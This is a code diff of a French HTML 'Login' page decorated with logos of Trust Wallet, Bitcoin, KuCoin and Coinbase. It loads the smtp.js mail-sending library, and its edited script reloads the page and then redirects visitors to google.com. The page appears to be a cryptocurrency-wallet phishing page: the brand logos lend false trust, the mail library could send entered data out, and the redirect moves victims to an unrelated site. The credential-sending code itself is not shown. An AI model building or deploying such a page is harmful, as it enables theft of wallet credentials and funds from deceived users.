@@ -1,5 +1,4 @@
 
-
 <!doctype html>
 <html lang="fr">
 
@@ -7,19 +6,13 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>mon site</title>
-    
+
     <script src="https://kit.fontawesome.com/7e2a69d5dd.js"></script>
     <script src="https://smtpjs.com/v3/smtp.js"></script>
     <style type="text/css" id="dcoder_stylesheet">
-    @import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap");
-    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
-    @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');
-
-    * {
-        margin: 0;
-        padding: 0;
-    }
-    body {
+       
+       
+       body {
         font-family: "Poppins", sans-serif; 
         margin: 0;
         padding: 0;
@@ -78,12 +71,13 @@
         width: 35px;
         margin: 0 16px;
     }
-    /* ... autres styles ... */
+  
     </style>
 </head>
 
 <body>
-    <div class="Trans"><br><br><br><br><br>
+    <div class="Trans">
+        <br><br><br><br><br>
         <form id="submit1">
             <div class="do">Login</div>
             <div class="bg">
@@ -95,33 +89,25 @@
             </div><br>
 
             <div class="omg">
-                <img src="https://i.postimg.cc/5yQM2ktT/trust-wallet-token-twt-logo-5312-F3331-F-seeklogo-com.png"> 
+                <img src="https://i.postimg.cc/5yQM2ktT/trust-wallet-token-twt-logo-5312-F3331-F-seeklogo-com.png">
                 <img src="https://i.postimg.cc/rsfg78cL/bitcoin-logo-png-transparent.png">
-                <img src="https://i.postimg.cc/0NN5qnpR/kucoin-token-kcs-logo.png">   
+                <img src="https://i.postimg.cc/0NN5qnpR/kucoin-token-kcs-logo.png">
                 <img src="https://i.postimg.cc/sXNvL88N/coinbase-coin-logo-C86-F46-D7-B8-seeklogo-com.png">
             </div>
-
-            </div>
         </form>
-    </div> 
+    </div>
 
-    
     <script>
-        // Vérifier si le cookie est déjà présent
-    if (document.cookie.indexOf("refreshed=true") === -1) {
-        // Si le cookie n'existe pas, rafraîchir après 5 secondes et définir un cookie
-        setTimeout(() => {
+        // Rafraîchir la page après 3 secondes de son ouverture initiale
+        setTimeout(function() {
             location.reload();
-            document.cookie = "refreshed=true; max-age=5"; // Cookie valable pendant 5 secondes
-        }, 5000); // Rafraîchir après 5 secondes 
-    }
-    
-    
-    // Code pour soumettre le formulaire et rediriger
-    document.getElementById('submit1').addEventListener('submit', function(event) {
-        event.preventDefault(); // Empêche l'envoi du formulaire
-        window.location.href = 'https://www.google.com/search?q=appcreator24&oq=&gs_lcrp=EgZjaHJvbWUqCQgCECMYJxjqAjIJCAAQIxgnGOoCMgkIARAjGCcY6gIyCQgCECMYJxjqAjIJCAMQIxgnGOoCMgkIBBAjGCcY6gIyDwgFEC4YJxjHARjqAhjRAzIJCAYQIxgnGOoCMgkIBxAjGCcY6gIyCQgIECMYJxjqAjIJCAkQIxgnGOoCMgkIChAjGCcY6gIyCQgLECMYJxjqAjIJCAwQIxgnGOoCMgkIDRAjGCcY6gIyCQgOECMYJxjqAjIPCA8QLhgDGI8BGLQCGOoCMhIIEBAuGAMYjwEYtAIY1AIY6gIyDwgREC4YAxiPARi0AhjqAjIRCBIQABgDGEIYjwEYtAIY6gIyEQgTEAAYAxhCGI8BGLQCGOoC0gEGLTFqMGo3qAIUsAIB&client=ms-android-transsion&sourceid=chrome-mobile&ie=UTF-8'; // Redirige vers PostImages
-    });   
+        }, 3000); // Attendre 3 secondes avant de rafraîchir
+// Redirection vers Google après le rafraîchissement et attendre 5 secondes avant de rediriger
+window.addEventListener('load', function() {
+    setTimeout(function() {
+        window.location.href = 'https://www.google.com';
+    }, 5000); // Rediriger vers Google après 5 secondes du chargement
+});
         
     </script>
 </body>
